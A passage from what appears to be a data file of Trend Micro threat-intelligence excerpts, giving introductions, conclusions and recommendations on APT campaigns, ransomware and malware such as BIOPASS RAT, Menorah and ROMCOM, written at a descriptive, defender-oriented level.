branches. Despite available solutions, the enhancements in infection methods and anti-analysis mechanisms have led to the most advanced variant so far - Deuterbear. The Deuterbear downloader employs HTTPS encryption for network traffic protection and implements various updates in malware execution, such as altering the function decryption, checking for debuggers or sandboxes, and modifying traffic protocols.\nAccording to our telemetry, Earth Hundun has continued to infiltrate the Asia-Pacific region, and the ongoing evolution of Waterbear and Deuterbear presents formidable challenges to organizational defense efforts.  As such, Trend Micro remains committed to further enhancing our monitoring and detection methods accordingly.", "source": "Trendmicro"}, {"title": "Introduction", "content": "We analyzed a new malware, which we attribute to theAPT34advanced persistent threat (APT) group, that was involved in a phishing attack. In August, our threat hunting activities identified a malicious document we investigated to have been used during a targeted phishing attack by the group. The malicious document is responsible for dropping a new malware we have called Menorah (taken from the malicious document's dropped executable, detected by Trend Micro as Trojan.W97M.SIDETWIST.AB), and for creating a scheduled task for persistence. The malware was designed for cyberespionage, capable of identifying the machine, reading and uploading files from the machine, and downloading another file or malware.\nDuring our investigation, there was little information about the victims targeted by this malware. But the file that APT34 used for this attack is called \"MyCv.doc,\" a license registration form related to the Seychelles Licensing Authority. However, we noted that the document contained pricing information in Saudi Riyal, which might indicate that the targeted victim was an organization inside the Kingdom of Saudi Arabia. This blog post provides an analysis of the group's latest malware and its capabilities, shows the attack process, and details the attackers' infrastructure.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "The similarities to the SideTwist backdoor suggests that APT34 is in continuous-development mode, changing up and trying which routines and techniques will work. Typical of APT groups, APT34 demonstrates their vast resources and varied skills, and will likely persist in customizing routines and social engineering techniques to use per targeted organization to ensure success in intrusions, stealth, and cyber espionage. The earlier variant of SideTwist is written in C, and this latest variant has a very similar set of functions but in a .NET implementation.\nWhile the techniques and malware infection routine in this sample are not on the same level of sophistication as thepreviously documentedattacks of the group, the techniques still work as they continue to redo and depend on them. As previous reports on APT34 have noted, the group uses simple routines and changes that, for security analysts and researchers, don't take long to track and analyze. But the group's arsenal and skills enable them to rapidly create new pieces of malware and tools, allowing the group to continuously deploy in successive cycles. Organizations should continuously warn and keep their employees aware of the different techniques that attackers employ to target systems, proprietary, and personal information.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Earth Baku (a threat actor associated with APT41)  has expanded its activities beyond the Indo-Pacific region to Europe, the Middle East, and Africa - targeting countries like Italy, Germany, UAE, and Qatar, with suspected threat activity in Georgia and Romania. \nThe group uses public-facing applications such as IIS servers as entry points, deploying advanced malware toolsets such as the Godzilla webshell, StealthVector, StealthReacher, and SneakCross. \nStealthVector and StealthReacher are customized loaders that deploy backdoor components while employing techniques such as AES encryption and code obfuscation for stealth. SneakCross, the group's latest backdoor, uses Google services for command-and-control (C&C) activities and boasts a modular design for easer updates. \nDuring post-exploitation, Earth Baku uses tools like a customized iox tool, Rakshasa, and Tailscale to maintain persistence, along with MEGAcmd for data exfiltration.\nEarth Baku, an advanced persistent threat (APT) actor that wepreviously wrote aboutin 2021, has expanded its activities to Europe, the Middle East, and Africa (MEA) beginning late 2022. The group has updated its tools, tactics, and procedures (TTPs) in more recent campaigns, making use of public-facing applications such as IIS servers as entry points for attacks, after which they deploy sophisticated malware toolsets on the victim's environment, including the loaders StealthVector and StealthReacher, and the modular backdoor SneakCross.", "source": "Trendmicro"}, {"title": "Victimology", "content": "Initially targeting the Indo-Pacific region with their earlier campaigns, Earth Baku started expanding their presence to Europe, the Middle East, and Africa, which includes countries such as Italy, Germany, UAE and Qatar. Furthermore, we also observed connections to the threat actor's infrastructure originating from Georgia, and multiple malware toolsets uploaded from Romania. Hence, we think these two countries are also likely under threat as well. Figure 1 shows all the regions which we believe are potentially under threat from Earth Baku.\nBased on our investigation, the targeted sectors included the following:\nGovernment \nMedia and Communications \nTelecom \nTechnology \nHealthcare \nEducation", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Earth Baku has significantly expanded its reach from the Indo-Pacific to Europe and MEA since late 2022. Their recent operations showcase advanced techniques, including the use of public-facing applications like IIS servers for initial access and the deployment of the Godzilla webshell for control. The group has employed new loaders such as StealthVector and StealthReacher, to stealthily launch backdoor components, and added SneakCross as their latest modular backdoor. Earth Baku also used several tools during its post-exploitation including a customized iox tool, Rakshasa, TailScale for persistence, and MEGAcmd for efficient data exfiltration. These developments underscore Earth Baku's evolving and increasingly sophisticated threat profile, which can potentially pose significant challenges for cybersecurity defenses.", "source": "Trendmicro"}, {"title": "Introduction", "content": "As modern ransomware attacks became one of the most dangerous cybersecurity incidents that can happen to organizations in recent years, we explored its current state and the possible directions that ransomware groups can take it. Noting that there are other cybercriminal business models where more illicit money can be made, and the changing geopolitical and economic conditions affecting this illegal enterprise, we looked at the possible triggers that can lead to gradual alterations in how we have observed ransomware business models are designed and operated.\nThis blog post discusses some of the possible triggers, detailed in \"The Near and Far Future of Ransomware Business Models,\" that can push Ransomware-as-a-Service (RaaS) groups to make small changes in their current operations (in the section we call \"Evolutions\"). Looking further ahead and considering the aggregation of these triggers and small changes, we look at the potentially larger modifications these groups can make to further other possible objectives in the long run (in the section \"Revolutions\"). While we identify five key points for impact in our research, this entry focuses on three points for discussion:\nWhen compelled, ransomware actors will adapt and adopt other criminal business models - online or offline - that monetize initial access, such as short and distort scheme or other forms of stock fraud, business email compromise (BEC), and cryptocurrency theft, among others. \nRansomware actors are expected to evolve and deploy routines with more automation, better operational security (OpSec), and adding new cloud targets and internet of things (IoT) platforms. Linux ransomware will likewise continue to grow. \nCryptocurrency crime is expected to grow significantly, and ransomware actors are expected to be involved in crypto crime sooner or later.\nKey Underground Services That Enable Ransomware\nOver the years, ransomware evolved to become a fusion of previously deployed threats that extorted the public. From this angle, we see that ransomware groups and their business models have never remained static and have considered themselves as profitable business ventures that need to constantly adjust with the changing technology and environment. This begs the question, where can ransomware go next?\nTo answer this question, we should consider the building blocks of today's ransomware models, varied and customized at each block and turn by ransomware groups to suit their needs in relation to their targets' environments. Each block can be seen as separate entities contributing to a whole ecosystem functioning:\nInitial access: Attackers find an entry vector into the targeted victim's network. Launching an email campaign with backdoor payloads, sending specifically crafted social engineering campaigns aimed at enterprises, exploiting vulnerabilities, and buying credentials from the underground are just some examples of ways to gain access to systems. \nLateral movement and privilege escalation: Attackers navigate deeper and around the victim's network with standard or customized hacking tools. \nSensitive data exfiltration: Attackers find sensitive information in the machines and steal it. Sifting through the data can also occur while navigating the victim machines or after exfiltration, allowing the threat actors to determine the ransom amount or if the victim has cyber insurance. \nBackup systems' disruption: Attackers disrupt and damage backup systems and processes in order to lower the victim's chances of restoring machines and recovering data on their own. \nRansomware payload deployment: Attackers encrypt files and IT systems, disrupting operations. \nExtortion methods: Attackers demand payment in exchange for the decryption keys to recover files and restore systems. Additional extortion methods are imposed on the victims if they choose not to pay the ransom. \nMoney laundering: Attackers launder their money via cryptocurrency to mask the real identities of the ransom beneficiaries. These are often done via cryptocurrency exchanges, mixers, or combinations of other tricky means.\nTriggers for change\nMuch like legitimate enterprises, ransomware groups see their deployment and attacks as businesses delve into business development. This coincides with internal and external changes that significantly mark and affect their operations. This section provides two examples of triggers that affect the key points for discussion. For the full list of triggers, download our researchhere.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Summary:\nAPT group Earth Kasha continues its activity with a new campaign in March 2025 that uses spear-phishing to deliver a new version of the ANEL backdoor, possibly for espionage based on the campaign's victimology. \nIn this campaign, the APT group believed to be a part of the larger APT10 group is targeting government agencies and public institutions in Taiwan and Japan. Potential impact could include information theft and sensitive data related to governance being compromised. \nThe ANEL file from the 2025 campaign discussed in this blog implemented a new command to support an execution of BOF (Beacon Object File) in memory. This campaign also potentially leveraged SharpHide to launch the second stage backdoor NOOPDOOR. \nWe provide recommendations for organizations to proactively secure their systems, including implementing a zero-trust approach to external and unrecognized One Drive links, and the continuous monitoring for any potential abuse of DNS over HTTPS. \nTrend Vision One\u2122 detects and blocks the IOCs discussed in this blog. Trend Vision One customers can also access hunting queries, threat insights, and threat intelligence reports to gain rich context and the latest updates on Earth Kasha.\nIn our monitoring of advanced persistent threats, we observed a new campaign targeting Taiwan and Japan that can be attributed to Earth Kasha. We detected campaign activity in March 2025, and found that it uses spear-phishing to deliver a new version of the ANEL backdoor.\nEarth Kasha, believed to be a part of the larger APT10 umbrella, has been conducting espionage campaigns since at least 2017 and are known to shift their techniques, tactics and toolsets frequently. Prior activity from the group was recorded in2024, where they targeted individuals affiliated with political organizations, research institutions, thinktanks, and organizations related to international relations in Japan via spear-phishing. It appears that the group is expanding targets in their new spear-phishing campaign this year to include government agencies and public institutions in Taiwan and Japan.\nWe assume that the motivation behind this campaign is espionage and information theft based on the victimology and post-exploitation TTPs. Considering that Earth Kasha's origin is believed to be China, a potential espionage campaign targeting Taiwan and Japan has significant geopolitical implications.\nIn this blog, we will discuss the TTPs, and malware observed in Earth Kasha's latest campaign.", "source": "Trendmicro"}, {"title": "recommendation", "content": "Earth Kasha continues to be an active advanced persistent threat and is now targeting government agencies and public institutions in Taiwan and Japan in its latest campaign which we detected in March 2025. Malicious actors behind the group continue to use spear-phishing to target their victims but employ slightly modified TTPs from their previous campaigns. A malicious Excel file now carries ROAMINGMOUSE, when before they used a Word file; additionally, the malicious routine trigger was also switched from a mousemove event to the click event.\nThe ANEL file we observed in this new campaign encrypts its version number like the ANEL file version from Earth Kasha's previous campaign in 2024, but we found that the ANEL file from the 2025 campaign implemented a new command to support an execution of BOF (Beacon Object File) in memory. This latest campaign also potentially leveraged SharpHide for persistence: to launch the second stage backdoor NOOPDOOR through the Hidden Start (hstart64.exe), and to hide a UI of MSBuild on autorun.\nEnterprises and organizations, especially those with high-value assets like sensitive data relating to governance, as well as intellectual property, infrastructure data, and access credentials should continue to be vigilant and implement proactive security measures to prevent falling victim to cyberattacks. We recommend the following measures so enterprises can help secure against the TTPs discussed in this blog:\nEducate users on the risks of selecting and opening external or unrecognized OneDrive links and implement a zero-trust policy when interacting with such links and files on unrecognized emails. \nMonitor potential abuse of DNS over HTTPS. \nDisable macros downloaded from the internet. \nMaximize endpoint detection response tools to detect suspicious activity.", "source": "Trendmicro"}, {"title": "Introduction", "content": "We found samples ofAvosLockerransomwarethat makes use of a legitimate driver file to disable antivirus solutions and detection evasion. While previous AvosLocker infections employ similar routines, this is the first sample we observed from the US with the capability to disable a defense solution using a legitimate Avast Anti-Rootkit Driver file (asWarPot.sys).  In addition, the ransomware is also capable of scanning multiple endpoints for the Log4j vulnerability Log4shell using Nmap NSE script.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "While AvosLocker has been documented for its abuse of AnyDesk for lateral movement as its preferred application, we note thatotherremote access applications can also be abused to replace it. We think the same can be said for the software deployment tool, wherein the malicious actors can subsequently decide to replace and abuse it with other commercially available ones. In addition, aside from its availability, the decision to choose the specific rootkit driver file is for its capability to execute in kernel mode (therefore operating at a high privilege).\nThis variant is also capable of modifying other details of the installed security solutions, such as disabling the legal notice. Other modern ransomware, such asMespinoza/Pysa, modify the registries of infected systems during their respective routines to inform their victims that they have been compromised.\nSimilar to previously documented malware and ransomware groups, AvosLocker takes advantage of the different vulnerabilities that have yet to be patched to get into organizations' networks. Once inside, the continuing trend of abusing legitimate tools and functions to mask malicious activities and actors' presence grows in sophistication. In this case, the attackers were able to study and use Avast's driver as part of their arsenal to disable other vendors' security products.\nHowever, and specific to this instance, the attempt to kill an antivirus product such as this variant's TaskKill can also be foiled. In this example using Trend Micro Vision One, the attempt was unsuccessful likely due to the product's self-protection feature, which allowed the sensors to continue sending data and block the noted routine. The visibility enabled by the platform allowed us as researchers to capture the extent of this ransomware's attack chain and replicate the driver file being abused to verify its function during compromise.\nAvast responded to our notification with this statement:\n\"We can confirm the vulnerability in an old version of our driver aswArPot.sys, which we fixed in our Avast 21.5 released in June 2021. We also worked closely with Microsoft, so they released a block in the Windows operating system (10 and 11), so the old version of the Avast driver can't be loaded to memory.\nThe below example shows that the blocking works (output from the \"sc start\" command):\n(SC) StartService FAILED 1275:\nThis driver has been blocked from loading\nThe update from Microsoft for the Windows operating system was published in February as an optional update, and in Microsoft's security release in April, so fully updated machines running Windows 10 and 11 are not vulnerable to this kind of attack.\nAll consumer and business antivirus versions of Avast and AVG detect and block this AvosLocker ransomware variant, so our users are protected from this attack vector.\nFor users of third-party antivirus software, to stay protected against this vulnerability, we recommend users to update their Windows operating system with the latest security updates, and to use a fully updated antivirus program.\"", "source": "Trendmicro"}, {"title": "Introduction", "content": "We discovered a new malware that targets online gambling companies in China via a watering hole attack, in which visitors are tricked into downloading a malware loader disguised as a legitimate installer for well-known apps such as Adobe Flash Player or Microsoft Silverlight. Closer examination of the loader shows that it loads either a Cobalt Strike shellcode or a previously undocumented backdoor written in Python, a new type of malware that we found to be named BIOPASS RAT (remote access trojan).\nBIOPASS RAT possesses basic features found in other malware, such as file system assessment, remote desktop access, file exfiltration, and shell command execution. It also has the ability to compromise the private information of its victims by stealing web browser and instant messaging client data.\nWhat makes BIOPASS RAT particularly interesting is that it can sniff its victim's screen by abusing the framework ofOpen Broadcaster Software(OBS) Studio, a popular live streaming and video recording app, to establish live streaming to a cloud service via Real-Time Messaging Protocol (RTMP). In addition, the attack misuses the object storage service (OSS) of Alibaba Cloud (Aliyun) to host the BIOPASS RAT Python scripts as well as to store the exfiltrated data from victims.\nWe consider BIOPASS RAT as still being actively developed. For example, some markers that we discovered during our analysis refer to different versions of RAT code, such as \"V2\" or \"BPSV3\". Many of the loaders that we found were used to load Cobalt Strike shellcode by default instead of the BIOPASS RAT malware. Furthermore, BIOPASS RAT also creates scheduled tasks to load the Cobalt Strike shellcode during the initialization, indicating that the malicious actor behind the attack still heavily relies on Cobalt Strike.\nWe also found several clues that show how the malware might be connected with theWinnti Group(also known as APT41).\nIn this blog entry, we will dive deeper into BIOPASS RAT with a detailed technical analysis of the infection chain, the different components of the malware, and any possible associations with Winnti.", "source": "Trendmicro"}, {"title": "findings", "content": "Although these are not implemented inside the BIOPASS RAT malware, we have observed two additional plug-ins that are written in Python (\"getwechatdb\" and \"xss_spoof\") and were deployed by the threat actor to a victim who had been infected with Cobalt Strike.\nThe script \"getwechatdb\" is used for exfiltrating the chat history from the WeChat Windows client. The script will detect the version of the installed WeChat client and grab the decryption key and the user ID. The predefined list of offsets is used to locate where the decryption key and the user ID are embedded. The list supports 36 different versions of memory offsets for the message client.\nThe script will then upload database files inside the WeChat folder including \"MicroMsg.db\" to cloud storage. These database files are used for saving the chat history. Finally, the script will print out the client ID and the decryption key that allows the malicious actors to decrypt the stolen database files of the chat history.\nThe other plug-in, \"xss_spoof\", is an archive that contains multiple Python scripts. The scripts are designed for web server infection via a cross-site scripting (XSS) attack. This plug-in can inject malicious scripts into the response of the victim's web server by leveraging the WinDivert package, which is used to sniff and manipulate the network traffic on Windows.\nThe scripts intercept HTTP GET requests that are sent to port 80. An \"ignore\" list is used to filter the file extensions of URLs to avoid manipulating resources that are not JavaScript or HTML. The script then modifies the original JavaScript or HTML content and delivers it to website visitors.\nThe delivered script is almost the same as the malicious script previously discussed in the section on the watering hole attack. The script performs checks by scanning localhost to determine if the machine is infected by BIOPASS RAT while showing the fake updated webpages. It is likely that the malicious actors compromised the web servers first and then ran \"xss_spoof\" for propagation.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Pawn Storm(also known as APT28 and Forest Blizzard) is an advanced persistent threat (APT) actor that shows incessant and lasting repetitions in its tactics, techniques, and procedures (TTPs). Some of the group's campaigns involve using the same kind of technical tricks repeatedly, sometimes targeting hundreds of people in a single organization at the same time.\nThe threat actor is known for still using its phishing email campaigns that are over a decade old and are sent to high-value targets around the world. Although the methods and infrastructure of these campaigns gradually change over time, they still provide valuable intelligence on Pawn Storm's infrastructure, including the ones it uses in more advanced campaigns.\nThis apparent lack of sophistication does not necessarily mean that the threat actor is not successful or that the campaigns are not advanced in nature. On the contrary, we have clear indications that Pawn Storm has compromised thousands of email accounts over time, with  some of these seemingly repetitive attacks being cleverly designed and stealthy. Some also use advanced TTPs. The loudness of the repetitive, oftentimes crude and aggressive campaigns, drown out the silence, subtlety, and complexity of the initial intrusion, as well as the post-exploitation actions that might occur once Pawn Storm gets an initial foothold in victim organizations.\nBased on our estimates, from approximately April 2022 until November 2023, Pawn Storm attempted to launch NTLMv2hash relay attacksthrough different methods, with huge peaks in the number of targets and variations in the government departments that it targeted. Those on the receiving end of Pawn Storm's malicious spear-phishing campaigns include organizations dealing with foreign affairs, energy, defense, and transportation. The group also targeted organizations involved with labor, social welfare, finance, parenthood, and even local city councils, a central bank, court houses, and the fire department of a country's military branch.\nAre these attempts at launching Net-NTLMv2 hash relay attacks too noisy and repetitive? Or are they just Pawn Storm's cost-efficient method of automating attempts to brute-force its way into the networks of governments, the defense industry, and military forces around the world?\nWe think that is more of the latter. Furthermore, the constant attacks on governments, logistics, and the defense industry in several regions hide the more advanced part of the attacks, asdescribed by the Polish ministry of defense\u200b\u200bandMicrosoftin recent blog postings\u200b.  Part of the group's post-exploitation activities involve the modification of folder permissions within the victim's mailbox, leading to enhanced persistence. Using the victim's email accounts, lateral movement is possible by sending additional malicious email messages from within the victim organization.\nThe group's targets include a wide range of tools from the government, the defense industry, the energy and transportation sectors, as well as the military. According to our telemetry, the targets were in Europe, North America, South America, Asia, Africa, and the Middle East.\nTable 1.  Pawn Storm targets in recent campaigns according to Trend Micro telemetry\nPawn Storm, which has been active since at least 2004, began focusing more on operational security during the past few years, with the group's TTPs changing slowly over time.\nOne of the most common methods used by Pawn Storm to break into systems is brute-force credential attacks. Since 2019, the actor has been actively trying tobrute-force its wayinto mail servers and the corporate virtual private network (VPN) services of organizations around the world\u200b\u200b.\nWe believe that Pawn Storm has had success with its campaigns and we assess that the threat actor has managed to breach thousands of email addresses, which we've observed are being abused to send additional waves of spear-phishing emails (most likely for information gathering, but also to be used as infrastructure for other attacks).\nTo help defenders learn more about the group's activities and adjust their defenses against Pawn Storm, we offer a technical analysis of some of the recent and updated techniques we have seen the group use.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Although Pawn Storm has been active for two decades, it still retains its aggressiveness and determination to break into the networks and emails of high-profile targets around the world.\nSince at least 2019, it has employed brute-force attacks (first from dedicated servers and then with additional anonymization layers such as commercial VPN services), Tor, and infrastructure that is very likely being shared with more standard cybercriminal use. Recently, Pawn Storm has been using more advanced and stealthy methods that are both loud and aggressive, which makes it difficult to determine what is happening in the victim's network post-compromise\u200b.\nIn the appendix, we have an extensive list of indicators that can help network defenders to check whether their organization has been targeted. Although Pawn Storm makes use of shared IP addresses, such as commercial VPN services and compromised EdgeOS routers, the group tends to use the same VPN exit nodes for days and even weeks. The relatively slow changes in the TTPs of Pawn Storm can help defenders detect the initial stages of a compromise, even when the threat actor uses more advanced tactics (and even zero-day vulnerabilities) for the succeeding stages.", "source": "Trendmicro"}, {"title": "Introduction", "content": "TIDRONE, an unidentified threat actor linked to Chinese-speaking groups, has demonstrated significant interest in military-related industry chains, especially in the manufacturers of drones' sector in Taiwan. \nThe threat cluster uses enterprise resource planning (ERP) software or remote desktops to deploy advanced malware toolsets such as the CXCLNT and CLNTEND. \nCXCLNThas basic upload and download file capabilities, along with features for clearing traces, collecting victim information such as file listings and computer names, and downloading additional portable executable (PE) files for execution. \nCLNTENDis a newly discovered remote access tool (RAT) that was used this April and supports a wider range of network protocols for communication. \nDuring the post-exploitation phase, telemetry logs revealed user account control (UAC) bypass techniques, credential dumping, and hacktool usage to disable antivirus products.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Since the beginning of 2024, we have been receiving incident response cases fromTaiwan. We track this unidentified threat cluster asTIDRONE. Our research reveals that the threat actors have shown significant interest in military-related industry chains, particularly in the manufacturers of drones. Furthermore, telemetry fromVirusTotalindicates that the targeted countries are varied; thus, everyone should stay vigilant of this threat.\nThis report also investigates the latest TTPs and the evolution of tools likeCXCLNTandCLNTEND, presenting the attack chain to illustrate the threat actor's behavior within victims' systems. The TTPs confirm that the threat actors have consistently updated their arsenal and optimized the attack chain. Notably, anti-analysis techniques are employed in their loaders, such as verifying the entry point address from the parent process and hooking widely-used Application Programming Interfaces (APIs) likeGetProcAddressto alter the execution flow.", "source": "Trendmicro"}, {"title": "Attribution", "content": "The consistency in file compilation times and the threat actor's operation time with other Chinese espionage-related activities supports the assessment that this campaign is likely being carried out by an as-yet unidentified Chinese-speaking threat group. The incidents we observed were highly targeted and limited in scope. The focus on military-related industry chains, particularly in the manufacturers of drones, suggests an espionage motive, given the sensitive data these entities typically hold. This further reinforces the likelihood thatTIDRONEis engaged in espionage-related activities.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "In this article, we investigatedTIDRONE, a threat actor linked to Chinese-speaking groups. The attacks were detected in Taiwan and mostly targeted military-related industries, specifically the manufacturer of drones. The activities involve advanced malware variants such as CXCLNT and CLNTEND which were spread through ERP software or remote desktops. We examined the technical details of these malicious activities to keep users informed about these types of threats.\nSome of the steps that organizations can take to protect themselves are as follows:\nDownload software only from trusted sources \nStay vigilant ofsocial engineering luresthat threat actors could use as entry points for attacks \nEmploy antimalware software that could detect early signs of compromise no matter where they are in the system\nTrend Micro Vision Oneoffers multilayered protection for diverse environments. With comprehensive prevention, detection, and response capabilities, it safeguards systems from breaches and attacks.", "source": "Trendmicro"}, {"title": "Introduction", "content": "While investigating theConfucius threat actor, we found a recent spear phishing campaign that utilizes Pegasus spyware-related lures to entice victims into opening a malicious document downloading a file stealer. The NSO Group's spyware spurred a collaborativeinvestigationthat found that it was being used to target high-ranking individuals in 11 different countries.\nIn this blog entry, we take a look at the lures used by the malicious actor and provide a short analysis of the file stealer used in the campaign, which was launched in early August.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Void Rabisu is an intrusion set associated with both financially motivated ransomware attacks andtargeted campaigns on Ukraine and countries supporting Ukraine. Among the threat actor's previous targets were the Ukrainian government and military, their energy and water utility sectors, EU politicians, spokespersons of a certain EU government, and security conference participants. In campaigns conducted in late June and early August 2023, Void Rabisu targeted EU military personnel and political leaders working on gender equality initiatives. Among the notable tools used by Void Rabisu is the ROMCOM backdoor, of which it seems to be the exclusive user. ROMCOM itself has gone through various developments over time, including the implementation of more effective detection evasion techniques.\nVoid Rabisu is one of the clearest examples where we see a mix of the typical tactics, techniques, and procedures (TTPs) used by cybercriminal threat actors and TTPs used by nation-state-sponsored threat actors motivated primarily by espionage goals. For example, Void Rabisu has been signing malware with certificates most likely bought from a third-party service provider that other cybercriminal groups are also using. The threat actor has also employed malicious advertisements on both Google and Bing to generate search engine traffic to their lure sites, which contain malicious copies of software often used by system administrators.\nVoid Rabisu also acts like an advanced persistent threat (APT) actor when it targets governments and military. In June 2023, Void Rabisu exploited the vulnerabilityCVE-2023-36884-  still a zero-day vulnerability then -  incampaignsusing the Ukrainian World Congress and the July 2023 NATO summit as lures. The extraordinary geopolitical circumstances surrounding the war in Ukraine drives some of the financial-seeking threat actors (including Void Rabisu) toward campaigns motivated by espionage.\nAs reported by Microsoft, Void Rabisu used a zero-day vulnerability related toCVE-2023-36884inattacks targeting governmentsat the end of June 2023. Trend Micro's telemetry further confirms that this campaign targeted the military, government personnel, and politicians in Europe.\nThe payload spread by Void Rabisu during this period differed from the ROMCOM backdoor we analyzed in anearlier blog entry, but the two have clear similarities. This indicates that the threat actors are actively developing the ROMCOM backdoor.\nThe next iteration of the malware was used in early August 2023. On or around Aug. 8, 2023, Void Rabisu set up a malicious copy of the official website of the Women Political Leaders (WPL) Summit that was held in Brussels from June 7 to 8, 2023. The final payload was a new version of ROMCOM backdoor that we have dubbed as \"ROMCOM 4.0\" (also known asPEAPOD).\nAttended by people from all over the world, the WPL summit aims to improve gender equality in politics. Among the topics included in the 2023 Brussels conference were peace and security, war and oppression, disinformation, the war in Ukraine, the role of women in politics, and gender equality. Since many current and future political leaders had attended this conference, it presented an interesting target for espionage campaigns and served as a possible avenue for threat actors to gain an initial foothold in political organizations. It is therefore not surprising that Void Rabisu set up a campaign targeting WPL Summit 2023 attendees. Our telemetry provided concrete evidence that this campaign was aimed at targets working on gender equality in EU politics.\nIn some of its latest campaigns, Void Rabisu started using a new technique that has not previously been reported on. It involves a TLS-enforcing technique by the ROMCOM command-and-control (C&C) servers that can render the automated discovery of ROMCOM infrastructure more difficult. We observed Void Rabisu using this technique in a May 2023 ROMCOM campaign that spread a malicious copy of the legitimate PaperCut software, in which the C&C server ignored requests that were not conformant.\nThis report provides a general background on Void Rabisu and its activities with regard to the recent WPL Summit campaign. We begin by describing how Void Rabisu targeted WPL Summit attendees in the following section.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Almost a year after Void Rabisu shifted its targeting from opportunistic ransomware attacks with an emphasis on cyberespionage, the threat actor is still developing its main malware, the ROMCOM backdoor. The backdoor being stripped down to its core, with additional components being downloaded as needed, provides Void Rabisu the choice of loading additional components for specific targets. From the attacker's perspective, this has the advantage of less exposure for the additional components, making it more difficult to collect for malware researchers.\nSome of Void Rabisu's campaigns very narrowly target politicians, government employees, and the military. This means that Void Rabisu has branched out into an area that is usually covered by APT groups typically thought to be nation-state-sponsored.\nWhile we have no evidence that Void Rabisu is nation-state-sponsored, it's possible that it is one of the financially motivated threat actors from the criminal underground that got pulled into cyberespionage activities due to the extraordinary geopolitical circumstances caused by the war in Ukraine.\nVoid Rabisu has targeted participants of at least three conferences in 2023, namely the Munich Security Conference, the Masters of Digital conference, and the WPL Summit. It is possible, and even expected, that other conferences and special interest groups will be targeted by Void Rabisu in the future. We will keep paying close attention to Void Rabisu's TTPs and report on new campaigns as we find them.", "source": "Trendmicro"}, {"title": "Introduction", "content": "In early 2022, we investigated an incident that compromised a company in Taiwan. The malware used in the incident was a simple but custom Cobalt Strike loader. After further investigation, however, we found incidents targeting multiple regions using a similar Cobalt Strike loader. While analyzing code similarities and tactics, techniques, and procedures (TTPs), we discovered that the actor behind this attack has been active since 2020. After clustering each intrusion, we concluded that the threat actor is a new subgroup of advanced persistent threat (APT) groupAPT41that we call Earth Longzhi. In this entry, we reveal two campaigns by Earth Longzhi from 2020 to 2022 and introduce some of the group's arsenal in these campaigns. This entry was also presented at theHITCON PEACE 2022conference in August this year.\nCampaign overview\nSince it first started being active in 2020, Earth Longzhi's long-running campaign can be divided into two based on the range of time and toolset. During its first campaign deployed from 2020 to 2021, Earth Longzhi targeted the government, infrastructure, and health industries in Taiwan and the banking sector in China. In its second campaign from 2021 to 2022, the group targeted high-profile victims in the defense, aviation, insurance, and urban development industries in Taiwan, China, Thailand, Malaysia, Indonesia, Pakistan, and Ukraine.", "source": "Trendmicro"}, {"title": "Introduction", "content": "We have uncovered a cyberespionage campaign being perpetrated by Earth Baku, an advanced persistent threat (APT) group with a known history of carrying out cyberattacks under the alias APT41. This is not the group's first foray into cyberespionage, and its long list ofpast cybercrimes also includes ransomware and cryptocurrency mining attacks.\nEarth Baku deploys its ongoing campaign, which can be traced to as far back as July 2020, through multiple attack vectors that are designed based on different exploits or the infrastructure of its targeted victim's environment:\n\u2022 SQL injection to upload a malicious file \n\u2022 Installment throughInstallUtil.exein a\u202fscheduled task \n\u2022 Possibly a malicious link (LNK) file sent as an email attachment \n\u2022 Exploitation\u202fof\u202fthe ProxyLogon vulnerability CVE-2021-26855 to upload a China Chopper web shell\nThis campaign uses previously unidentified shellcode loaders, which we have named StealthVector and StealthMutant, and a backdoor, which we have dubbed ScrambleCross. Earth Baku has developed these new malware tools to facilitate targeted attacks on public and private entities alike in specific industries that are located in the Indo-Pacific region. Thus far, the affected countries include India, Indonesia, Malaysia, the Philippines, Taiwan, and Vietnam.\nFigure 1. Countries affected by Earth Baku's new campaign\nSource: Trend Micro\u2122 Smart Protection Network\u2122 infrastructure", "source": "Trendmicro"}, {"title": "Introduction", "content": "We discovered a threat actor we named Water Labbu that was targeting cryptocurrency scam websites. Typically, cryptocurrency scammers use social engineering techniques,  interacting with victims to gain their trust and then manipulating them into providing the permissions needed to transfer cryptocurrency assets. While Water Labbu managed to steal cryptocurrencies via a similar method by obtaining access permissions and token allowances from their victim's wallets, unlike other similar campaigns, they did not use any kind of social engineering - at least not directly. Instead, Water Labbu lets other scammers use their social engineering tricks to scam unsuspecting victims.\nIn a parasitic manner, the threat actor compromised the websites of other scammers posing as a decentralized application (DApp) and injected malicious JavaScript code into them. The techniques used by the original scammers are detailed in analertreleased from law enforcement agencies.\nWhen the threat actor finds a victim who has a large amount of cryptocurrency stored in a wallet that is connected to one of the scam websites, the injected JavaScript payload will send a request for permissions. The request is disguised to look like it was being sent from a compromised website and asks for permission (token allowance) to transfer a nearly-unlimited amount ofUSD Tether(USDT, which is astablecoinpegged to the US dollar with a value of 1:1) from the target's wallet.\nWater Labbu's targets are led to believe that the request was originally issued by a DApp, which may cause them to disregard thoroughly reviewing the permission's details. However, the granted permission does not belong to the crypto addresses of the original scammer, but to another address controlled by Water Labbu. The threat actor can then use the obtained permission to drain all USDT funds from the victim's wallet.\nAs of the time of writing, we found 45 fraudulent cryptocurrency-related DApp websites that have been compromised by Water Labbu. These websites show similar styles and themes to the websites used in the \"Lossless Mining Liquidity Pledge Free\" scams.\nUpon checking the transaction records of the threat actor's addresses on the Ethereum blockchain, we discovered that they have successfully stolen funds from at least nine different victims for a total amount of at least 316,728 USDT.\nIn the following sections, we are going to share how the actor used injected JavaScript code to hijack cryptocurrency from fraudulent DApp websites, as well as additional findings that hints at how they may have compromised scammers.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Water Labbu has managed to steal cryptocurrency funds by injecting their malicious scripts to fraudulent websites of other scammers, showing a willingness to exploit the methods of other malicious actors for their own ends. Fortunately, traditional best practices for security are still applicable in this situation and can help users avoid the group's schemes.\nUsers should be careful of any invitations for investment that originate from untrusted parties. Furthermore, they should not trade cryptocurrency funds on any unknown platform without thoroughly vetting its legitimacy, understanding what it does, and how it operates. We suggest that users review the parameters of the 